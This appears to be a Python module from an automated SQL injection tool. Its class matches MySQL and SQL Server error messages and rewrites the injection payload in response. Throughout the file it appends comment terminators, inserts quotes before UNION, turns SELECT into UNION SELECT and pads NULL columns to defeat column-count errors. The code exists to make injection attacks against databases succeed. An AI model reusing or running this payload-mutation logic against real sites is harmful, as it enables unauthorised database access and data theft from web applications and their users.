import re

class SQLErrorRefiner:
    def __init__(self):
        # Patterns to match common SQL errors and their fixes
        self.error_fixes = [
            {
                "pattern": r"right syntax to use near '([^']*)' at line",
                "fix_type": "SYNTAX_NEAR",
                "strategy": "Check for unclosed quotes or parentheses near the reported area."
            },
            {
                "pattern": r"unclosed quotation mark after the character string",
                "fix_type": "UNCLOSED_QUOTE",
                "strategy": "Add a closing quote or a comment character (--) to terminate the string."
            },
            {
                "pattern": r"The used SELECT statements have a different number of columns",
                "fix_type": "COLUMN_MISMATCH",
                "strategy": "Increase or decrease the number of NULLs in the UNION SELECT statement."
            },
            {
                "pattern": r"Unknown column '([^']*)' in 'order clause'",
                "fix_type": "ORDER_BY_ERROR",
                "strategy": "The column index is too high. Reduce the number in ORDER BY."
            },
            {
                "pattern": r"Operand should contain 1 column",
                "fix_type": "SUBQUERY_COLUMNS",
                "strategy": "Ensure subqueries only return a single column."
            }
        ]

    def refine(self, payload, error_msg):
        """Suggests a mutation strategy based on the specific SQL error."""
        for fix in self.error_fixes:
            match = re.search(fix["pattern"], error_msg, re.IGNORECASE)
            if match:
                # Capture the exact token causing the issue if applicable
                problem_token = match.group(1) if len(match.groups()) > 0 else None
                return {
                    "type": fix["fix_type"],
                    "strategy": fix["strategy"],
                    "problem_token": problem_token,
                    "original_payload": payload
                }
        return None

    def apply_fix(self, payload, fix_info):
        """Applies a heuristic or syntactic fix to the payload."""
        fix_type = fix_info["type"]
        problem_token = fix_info.get("problem_token")
        
        if fix_type == "UNCLOSED_QUOTE":
            if "'" in payload and not payload.endswith("-- -"):
                return payload + "-- -"
            if '"' in payload and not payload.endswith("#"):
                return payload + "#"
                
        elif fix_type == "SYNTAX_NEAR" and problem_token:
            # Grammar-based adjustment:
            # If MySQL choked near 'UNION', we likely need to add a space or close a quote before it.
            if "UNION" in problem_token.upper():
                return payload.replace("UNION", " ' UNION")
            if "SELECT" in problem_token.upper() and "UNION" not in payload.upper():
                return payload.replace("SELECT", " UNION SELECT")
        
        elif fix_type == "COLUMN_MISMATCH":
            # Syntactic feedback: Increase columns properly
            if "UNION SELECT" in payload.upper():
                # Attempt to parse cols and add one
                parts = re.split(r"(UNION\s+SELECT\s+)", payload, flags=re.IGNORECASE)
                if len(parts) >= 3:
                    return f"{parts[0]}{parts[1]}{parts[2]},NULL"
                    
        return payload # Default: no change, let the AST handle it
